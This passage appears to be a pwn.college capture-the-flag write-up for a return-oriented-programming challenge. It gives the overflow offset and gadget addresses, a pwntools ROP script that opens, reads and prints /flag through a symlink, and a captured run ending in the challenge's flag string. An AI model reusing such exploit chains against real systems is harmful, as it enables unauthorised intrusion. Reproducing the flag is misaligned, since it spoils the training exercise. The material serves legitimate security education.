        0x00000000004003c8 - 0x0000000000400590 is .dynsym
        0x0000000000400590 - 0x0000000000400653 is .dynstr
        0x0000000000400654 - 0x000000000040067a is .gnu.version
        0x0000000000400680 - 0x00000000004006a0 is .gnu.version_r
        0x00000000004006a0 - 0x0000000000400700 is .rela.dyn
        0x0000000000400700 - 0x0000000000400850 is .rela.plt
        0x0000000000401000 - 0x000000000040101b is .init
        0x0000000000401020 - 0x0000000000401110 is .plt
        0x0000000000401110 - 0x00000000004011f0 is .plt.sec
        0x00000000004011f0 - 0x00000000004024f5 is .text
        0x00000000004024f8 - 0x0000000000402505 is .fini
        0x0000000000403000 - 0x0000000000403388 is .rodata
        0x0000000000403388 - 0x0000000000403404 is .eh_frame_hdr
        0x0000000000403408 - 0x00000000004035f0 is .eh_frame
        0x0000000000404e00 - 0x0000000000404e08 is .init_array
        0x0000000000404e08 - 0x0000000000404e10 is .fini_array
        0x0000000000404e10 - 0x0000000000404ff0 is .dynamic
        0x0000000000404ff0 - 0x0000000000405000 is .got
        0x0000000000405000 - 0x0000000000405088 is .got.plt
        0x0000000000405088 - 0x0000000000405098 is .data
        0x00000000004050a0 - 0x00000000004050f8 is .bss
```

- [x] Offset between buffer and stored return address to `main()`: `88`
   - Buffer address: `0x7ffcd4fe1ae0`
   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
- [x] Location of a NULL terminated string: `0x403386`
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [x] Location to which flag is to be read: `0x4050a0`

### Exploit

```
hacker@return-oriented-programming~indirect-invocation-easy:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

# Ensure 8-byte packing for 64-bit addresses
context.arch = 'amd64'

# Gadgets
pop_rdi = 0x40229e
pop_rsi = 0x402296
pop_rdx = 0x40228e

# PLT Entries
open_plt = 0x4011d0
read_plt = 0x401160
puts_plt = 0x401130

# Memory Addresses
bang_addr = 0x403386     
writable_buff = 0x405100 
offset = 88

p = process('/challenge/indirect-invocation-easy')

# ROP chain using regular flat() list
payload = flat(
    b"A" * offset,

    # open("!", O_RDONLY)
    pop_rdi, bang_addr,
    pop_rsi, 0,
    open_plt,
    
    # read(3, writable_buff, 100)
    pop_rdi, 3,
    pop_rsi, writable_buff,
    pop_rdx, 100,
    read_plt,
    
    # puts(writable_buff)
    pop_rdi, writable_buff,
    puts_plt
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~indirect-invocation-easy:~$ python ~/script.py
[+] Starting local process '/challenge/indirect-invocation-easy': pid 2281
[*] Switching to interactive mode
###
### Welcome to /challenge/indirect-invocation-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

Received 209 bytes! This is potentially 15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 16 gadgets of ROP chain at 0x7ffc1158a9d8.
| 0x000000000040229e: pop rdi ; ret  ; 
| 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; jl 0x40338e ; add byte ptr [rax], al ; 
| 0x0000000000402296: pop rsi ; ret  ; 
| 0x0000000000000000: (UNMAPPED MEMORY)
| 0x00000000004011d0: endbr64  ; bnd jmp qword ptr [rip + 0x3e9d] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3e95] ; nop dword ptr [rax + rax] ; endbr64  ; xor ebp, ebp ; mov r9, rdx ; pop rsi ; mov rdx, rsp ; and rsp, 0xfffffffffffffff0 ; push rax ; push rsp ; mov r8, 0x4024f0 ; 
| 0x000000000040229e: pop rdi ; ret  ; 
| 0x0000000000000003: (UNMAPPED MEMORY)
| 0x0000000000402296: pop rsi ; ret  ; 
| 0x0000000000405100: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; 
| 0x000000000040228e: pop rdx ; ret  ; 
| 0x0000000000000064: (UNMAPPED MEMORY)
| 0x0000000000401160: endbr64  ; bnd jmp qword ptr [rip + 0x3ed5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ecd] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ec5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ebd] ; nop dword ptr [rax + rax] ; 
| 0x000000000040229e: pop rdi ; ret  ; 
| 0x0000000000405100: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; 
| 0x0000000000401130: endbr64  ; bnd jmp qword ptr [rip + 0x3eed] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ee5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3edd] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ed5] ; nop dword ptr [rax + rax] ; 
| 0x000000000000000a: (UNMAPPED MEMORY)

Leaving!
pwn.college{g088n-yvU9xj4wn0pJJLgqCf0VN.0VM1MDL4ITM0EzW}

[*] Process '/challenge/indirect-invocation-easy' stopped with exit code -11 (SIGSEGV) (pid 2281)
[*] Got EOF while reading in interactive
$  
```